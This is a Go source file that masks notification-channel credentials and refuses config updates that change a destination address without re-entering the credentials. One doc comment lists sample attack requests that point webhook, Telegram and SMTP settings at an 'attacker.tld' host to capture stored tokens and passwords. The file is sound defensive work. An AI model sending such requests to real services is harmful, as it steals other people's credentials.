package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for a masked value. When the API echoes a
// credential it replaces the real content with a value carrying this prefix, and
// when the update endpoint receives a value with this prefix it understands it as
// "keep the stored value unchanged".
//
// A prefix is used rather than an empty string or some fixed constant so that a
// little identifying information can be carried along (see MaskedValue), letting
// the user tell "which bot this is" without having to re-paste the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original is too short, give no hint
//	"__masked__:…ab12cd"      carry the original's last 6 chars as an identifying hint
//
// Exposing only the last 6 chars is a deliberate choice: a webhook URL's
// identifying information is in its last segment (such as WeCom's key or Feishu's
// bot id), whereas the prefix part is the same across bots and has no identifying
// value. The last 6 chars aren't enough to reconstruct the credential but are
// enough for the configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified after the
// API echo).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields
// replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config —
// better to have the UI show "config unavailable" than to spill possibly
// credential-bearing raw content back when the channel type can't be recognized.
// Non-credential fields are kept as-is so the UI can display normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure like headers is treated as a single credential as a
		// whole: judging each sub-key would require every channel to declare another
		// "which sub-keys are credentials" rule set, far more complexity than it's
		// worth.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed,
// but the caller didn't confirm the credential fields". It is returned rather
// than silently allowing or silently discarding the credentials, for the reason
// in PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // the destination keys that changed
	Missing []string // the credential keys not explicitly confirmed
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): fill in new values, or explicitly leave them empty to indicate credentials are no longer needed. " +
		"The original credentials are valid only for the old address, and continuing to use them is the same as handing them to the new address."
}

// PrepareConfigUpdate merges a channel config and handles the security-sensitive
// case of a "destination address change".
//
// It replaces a bare MergeConfig on the channel-update path, solving this
// empirically viable path: the destination address (where messages go) and the
// credentials (what identity sends them) are two independent field sets, while
// MergeConfig keeps the stored value for any "unmentioned key". So anyone who can
// PATCH a channel only has to **change the address and say nothing about the
// credentials** to make the server send the real stored credentials to an
// endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → original Authorization header sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and doesn't rely on redirects (so rejecting
// cross-host jumps can't stop it), and it directly defeats this package's masking
// goal — "credentials are not echoed to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must
// explicitly confirm **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential
//     (preserving the clear semantics)
//   - echo back the masked value / simply omit the key → reject
//
// The third case is also rejected because the meaning of a "masked value" is
// precisely "keep using the old credential", and the old credential is valid only
// for the old address. "Automatically discarding the credential" is deliberately
// not done here — for optional credential fields (webhook's headers, email's
// password) that would silently become "auth is gone but the endpoint returns
// 200", harder to troubleshoot than an error. Better to have the operator fill it
// in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as webhook's headers, which is an
	// object) embeds the mask literal, it means the caller stuffed the "keep the
	// stored value" sentinel inside the structure. MergeConfig recognizes only "a
	// string with the prefix" as masked, so this shape would be stored as-is as an
	// ordinary object — the literal "__masked__" genuinely lands in the database,
	// and subsequent auth silently fails with no error at all. Better to reject it.
	//
	// This check must come **first**: when the address hasn't changed the function
	// takes an early return, so putting it later would cover only the "address
	// changed" path (the first version put it in the wrong place, and the tests
	// caught it immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that genuinely changed. A masked value equals "not
	// changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do an ordinary merge (masked values keep the stored
		// value, empty strings clear, the rest overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit confirmation for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers refuses a submission that embeds the mask sentinel
// inside a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field
// like webhook's headers can only be masked as a whole (written as the string
// "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// neither expresses "keep unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q in its content: this field can only be left empty as a whole to keep the existing value, or submitted as a whole with a new value; a mask placeholder cannot be slipped inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing
// via JSON serialization also handles type differences — the frontend submits the
// port as a number, while the database reads it back as float64, and a direct ==
// would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and "key does not
// exist" are the same state in this config model, because MergeConfig treats an
// empty string as an explicit clear and deletes the key outright. Without
// normalization, an optional destination field left perpetually empty (Telegram's
// base_url is the only such field: empty means use the official address) would go
// down this path —
//
//	stored at creation as base_url:""  →  first save, MergeConfig deletes the key
//	→ second save, incoming is "" and stored lacks the key, judged "address changed"
//	→ credential is a masked value → 400 "destination address changed, please also re-enter the credential fields"
//
// From then on every save fails, unless the user re-pastes the Bot Token, having
// changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// The criterion must match MergeConfig's clear decision (strings.TrimSpace(s) ==
// ""), or there would be a gap where "MergeConfig thinks it should be deleted but
// sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating a channel config.
//
// Rules:
//   - a key whose incoming value is masked → keep stored's value (the user didn't
//     change this field)
//   - a key whose incoming value is an empty string → treated as an explicit
//     clear, delete the key
//   - all other keys → overwrite with incoming's value
//   - keys present in stored but not in incoming → kept (partial-update semantics)
//
// Whether an empty string counts as "clear" must be defined: the frontend form
// submits an unfilled field as an empty string, and treating it as a valid value
// to write would genuinely clear a field that was "left empty to keep the stored
// value". Explicit clear is chosen here because, to clear a misconfigured field,
// the user has no other way to express it (dropping the field could distinguish
// "not provided" from "provided empty", but the UI doesn't use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
